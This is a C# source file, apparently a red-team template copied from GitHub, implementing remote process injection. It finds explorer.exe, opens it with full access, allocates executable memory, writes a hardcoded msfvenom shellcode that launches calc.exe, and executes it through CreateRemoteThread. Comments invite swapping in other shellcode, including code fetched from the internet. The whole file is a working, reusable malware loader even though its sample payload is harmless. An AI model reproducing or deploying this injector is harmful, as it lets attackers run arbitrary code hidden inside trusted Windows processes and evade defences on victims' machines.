﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

// Source: https://github.com/tasox/CSharp_Process_Injection/blob/main/01.%20Process_Injection_template_(High%20Level%20Windows%20API)/Program.cs
// Warning: compile strictly for x64, not AnyCPU!

namespace InjectorRemote
{
    public class Program
    {
        // Use PInvoke to import the APIs we want to use 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public static void Main(string[] args)
        {
            // Define your shellcode. The shellcode can be hardecoded in the program, it can be retrieved from the internet etc.
            // var shellcode = new byte[]{/* Shellcode here */};

            // Example calculator shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
            byte[] shellcode = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
                0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
                0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
                0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
                0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
                0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
                0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
                0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
                0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
                0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
                0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
                0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
                0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
                0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
                0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,
                0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
                0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
                0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x2e,0x65,0x78,0x65,0x00
            };

            // Find the explorer.exe process (or any process we want to inject into)
            var explorerProcs = Process.GetProcessesByName("explorer");
            if(explorerProcs.Length <= 0)
            {
                Console.WriteLine("Failed to find the process, exitting.");
                return;
            }
            var explorerProc = explorerProcs[0];

            // Obtain a handle for the explorer.exe process, use PROCESS_ALL_ACCESS
            var hProcess = OpenProcess(0x001F0FFF, false, explorerProc.Id);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("Failed to obtain the handle for the process, exitting.");
                return;
            }

            // Allocate RWX memory in the remote process, for allocation types etc. see the documentation - https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
            var remoteAddr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            if (remoteAddr == IntPtr.Zero)
            {
                Console.WriteLine("Failed to allocate RWX memory in the process, exitting.");
                return;
            }

            // Write the shellcode into the allocated memory region
            IntPtr outSize;
            var r = WriteProcessMemory(hProcess, remoteAddr, shellcode, shellcode.Length, out outSize);
            if (!r)
            {
                Console.WriteLine("Failed to write shellcode to the memory region, exitting.");
                return;
            }
            
            // Create the thread in the memory region to execute the shellcode
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("Failed to create remote thread, exitting.");
                return;
            }
        }
    }
}
